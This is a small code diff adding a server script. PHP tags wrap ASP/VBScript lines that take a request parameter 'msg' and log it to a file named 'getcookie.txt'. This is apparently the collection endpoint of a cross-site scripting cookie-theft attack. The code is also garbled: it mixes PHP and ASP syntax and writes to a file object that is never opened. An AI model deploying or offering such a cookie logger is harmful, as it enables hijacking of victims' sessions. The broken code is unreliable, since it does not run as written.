@@ -1,0 +1,9 @@
+ 
+<?php
+      testfile=server.MapPath("getcookie.txt")
+      msg=request("msg")
+      set fs=server.CreateObject("Scripting.FileSystemObject")
+      thisisfile.writeline(""&msg&"")
+      thisisfile.close
+      set fs=nothing
+?>
